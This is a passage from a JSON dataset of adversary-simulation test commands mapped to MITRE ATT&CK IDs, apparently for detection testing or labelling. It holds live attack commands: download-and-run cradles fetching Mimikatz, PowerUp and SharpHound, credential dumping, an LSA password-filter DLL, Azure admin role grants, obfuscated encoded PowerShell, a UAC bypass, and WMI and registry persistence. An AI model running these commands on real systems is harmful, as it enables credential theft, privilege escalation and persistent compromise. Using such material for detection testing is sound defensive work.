        "Command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$AuthenticationPackagesValues = $lsaKey.GetValue(\"Authentication Packages\")\n$AuthenticationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Authentication Packages\" $AuthenticationPackagesValues\n",
        "Description": "lsass.exe loads all DLLs specified by the Authentication Packages REG_MULTI_SZ value.\nUses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1556.002",
        "Shell": "powershell"
    },
    {
        "ID": 1188,
        "Command": "Import-Module MSOnline\n$Password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Password\nConnect-MsolService -Credential $Credential\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\"\n",
        "Description": "Add an existing Azure user account the Company Administrator Role.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098.003",
        "Shell": "powershell"
    },
    {
        "ID": 1189,
        "Command": "Import-Module MSOnline\nImport-Module AzureAD\n$password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $password\n$targetsecurepw = ConvertTo-SecureString -String \"Ohn05GeMe#$\" -AsPlainText -Force\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\n\n#Saving the ObjectId of the target_user into a variable\n$target_objid = Get-AzureADUser -filter \"userPrincipalName eq 'default'\" | Select-Object -ExpandProperty ObjectId\n\n#Reset the password of the target_user\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\n\n#Adding target_user\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\"\nAdd-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"default\"\n",
        "Description": "This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098.003",
        "Shell": "powershell"
    },
    {
        "ID": 1190,
        "Command": "%windir%\\system32\\inetsrv\\appcmd.exe install module /name:DefaultDocumentModule_Atomic /image:%windir%\\system32\\inetsrv\\defdoc.dll\n",
        "Description": "The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using AppCmd.exe.\n[Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1505.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 1191,
        "Command": "New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\\system32\\inetsrv\\defdoc.dll\n",
        "Description": "The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using New-WebGlobalModule.\n[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1505.004",
        "Shell": "powershell"
    },
    {
        "ID": 1192,
        "Command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\n",
        "Description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1193,
        "Command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\ncatch { $_; exit $_.Exception.HResult}\nStart-Sleep 5\n",
        "Description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1194,
        "Command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n",
        "Description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1195,
        "Command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n",
        "Description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1196,
        "Command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n",
        "Description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1197,
        "Command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n",
        "Description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1198,
        "Command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\"\n",
        "Description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1199,
        "Command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\"\n",
        "Description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1200,
        "Command": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n",
        "Description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nInvoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "manual"
    },
    {
        "ID": 1201,
        "Command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
        "Description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1202,
        "Command": "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n",
        "Description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1203,
        "Command": "New-PSSession -ComputerName $env:COMPUTERNAME\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n",
        "Description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1204,
        "Command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop",
        "Description": "Executes powershell.exe with variations of the -Command parameter",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1205,
        "Command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop",
        "Description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1206,
        "Command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop",
        "Description": "Executes powershell.exe with variations of the -EncodedCommand parameter",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1207,
        "Command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop",
        "Description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1208,
        "Command": "powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==\n",
        "Description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1209,
        "Command": "$malcmdlets = \"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"\n\nforeach ($cmdlets in $malcmdlets) {\n\\t\"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n\\t$cmdlets}\n",
        "Description": "Powershell execution of known Malicious PowerShell Cmdlets",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1210,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n",
        "Description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1211,
        "Command": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n",
        "Description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1212,
        "Command": "PathToAtomicsFolder\\T1059.001\\bin\\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\\temp\\cache.txt --outputdirectory c:\\temp\\test2\n",
        "Description": "Dump BloodHound data using SOAPHound. Upon execution, BloodHound data will be dumped and stored in the specified output directory.\nsrc: https://github.com/FalconForceTeam/SOAPHound\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1213,
        "Command": "PathToAtomicsFolder\\T1059.001\\bin\\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\\temp\\cache.txt\n",
        "Description": "Build cache using SOAPHound. Upon execution, a cache will be built and stored in the specified cache filename.\nsrc: https://github.com/FalconForceTeam/SOAPHound\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.001",
        "Shell": "powershell"
    },
    {
        "ID": 1214,
        "Command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n\\t\\t\\t\\tEventNameSpace='root\\CimV2';\n\\t\\t\\t\\tQueryLanguage=\"WQL\";\n\\t\\t\\t\\tQuery=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n\\t\\t\\t\\tCommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n",
        "Description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.003",
        "Shell": "powershell"
    },
    {
        "ID": 1215,
        "Command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n\\t\\t\\t\\tEventNameSpace='root\\CimV2';\n\\t\\t\\t\\tQueryLanguage=\"WQL\";\n\\t\\t\\t\\tQuery=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n\\t\\t\\t\\tScriptingEngine='VBScript';\n\\t\\t\\t\\tScriptText='\n\\t\\t\\t\\tSet objws = CreateObject(\"Wscript.Shell\")\n\\t\\t\\t\\tobjws.Run \"notepad.exe\", 0, True\n\\t\\t\\t\\t'}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs\n",
        "Description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.003",
        "Shell": "powershell"
    },
    {
        "ID": 1216,
        "Command": "c:\\windows\\system32\\wbem\\mofcomp.exe \"PathToAtomicsFolder\\T1546.003\\src\\T1546.003.mof\"\n",
        "Description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.003",
        "Shell": "powershell"
    },
    {
        "ID": 1217,
        "Command": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\n",
        "Description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "powershell"
    },
    {
        "ID": 1218,
        "Command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\"",
        "Description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "powershell"
    },
    {
        "ID": 1219,
        "Command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"notepad.exe\" -PropertyType \"String\"",
        "Description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "powershell"
    },
    {
        "ID": 1220,
        "Command": "# Set the remote computer name and credentials\n $RemoteComputer = \"localhost\"\n $PWord = ConvertTo-SecureString -String \"P@ssword1\" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"Administrator\", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \"calc.exe\"\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n\\t Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\"\n } else {\n\\t Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\"\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession \n",
        "Description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "powershell"
    },
    {
        "ID": 1221,
        "Command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n",
        "Description": "When applications hang, the Windows Error Reporting framework allows us to attach a debugger, if it is set up in the Registry.\nAdding executable of choice will let the executable to auto-execute when during any application crash due to functioning of WER framework\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "command_prompt"
    },
    {
        "ID": 1222,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Terminal Server Client\" /v ClxDllPath /t REG_SZ /d \"C:\\Windows\\System32\\amsi.dll\" /f\n",
        "Description": "Adding ClxDllPath under Terminal Server Client subkey of HKLM hive with a path to custom DLL allows for DLL loading during execution of mstsc.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "command_prompt"
    },
    {
        "ID": 1223,
        "Command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin\" /v Path /t REG_SZ /d \"C:\\Windows\\System32\\amsi.dll\" /f",
        "Description": "When remote desktop session is accepted, the system queries the key it queries the Registry key:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\TestDVCPlugin. \nIf such key exists, the OS will attempt to read the Path value underneath.Once the Path is read, the DLL that it points to will be loaded via LoadLibrary.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "command_prompt"
    },
    {
        "ID": 1224,
        "Command": "Copy-Item -Path PathToAtomicsFolder\\T1546\\src\\ErrorHandler.cmd -Destination C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd\nC:\\windows\\System32\\oobe\\Setup\n",
        "Description": "Create persistence by triggering script within ErrorHandler.cmd upon the execution of specific binaries within the oobe directory.\nUpon test execution, Setup.exe will be executed to further execute script within ErrorHandlercmd to launch Notepad.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "powershell"
    },
    {
        "ID": 1225,
        "Command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Options\" /v STARTUP-PATH /t REG_SZ /d \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" /f",
        "Description": "When Word starts, it searches for the registry key HKCU\\Software\\Microsoft\\Office\\<version>\\Word\\Options\\STARTUP-PATH and if it exists,\nit will treat it as a user specific start-up folder and load the contents of the folder with file extensions of .wll,.lnk,.dotm,.dot,.dotx\nThe registry key can be abused to load malware from the mentioned path. Reboot might be required.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546",
        "Shell": "command_prompt"
    },
    {
        "ID": 1226,
        "Command": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1\n",
